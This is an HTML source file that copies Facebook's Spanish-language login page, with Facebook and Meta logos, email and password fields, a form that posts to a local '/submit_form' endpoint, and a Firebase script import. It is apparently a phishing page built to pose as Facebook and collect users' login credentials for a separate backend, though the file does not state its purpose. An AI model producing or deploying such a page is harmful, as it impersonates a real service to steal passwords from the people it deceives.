<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="language">
        Español (España)
    </div>
    <div class="container">
        <div class="logo">
            <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo">
        </div>
        <form action="/submit_form" method="post">
            <div class="form-group">
                <input type="text" id="email" name="email" placeholder="Celular o correo electrónico" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="Contraseña" required>
            </div>
            <button type="submit" class="btn">Iniciar sesión</button>
            <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
        </form>
        <div class="create-account">
            <button type="button">Crear cuenta nueva</button>
        </div>
        <div class="meta">
            <p>
                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yM/r/DDgwTv3JehF.png" alt="Meta Logo">
            </p>
            <a href="#">Información</a>
            <a href="#">Ayuda</a>
            <a href="#">Más</a>
        </div>
    </div>

    <div id="message"></div> <!-- Para mostrar mensajes de error -->

    <!-- Importar el archivo Firebase -->
    <script type="module" src="firebase.js"></script>
</body>
</html>
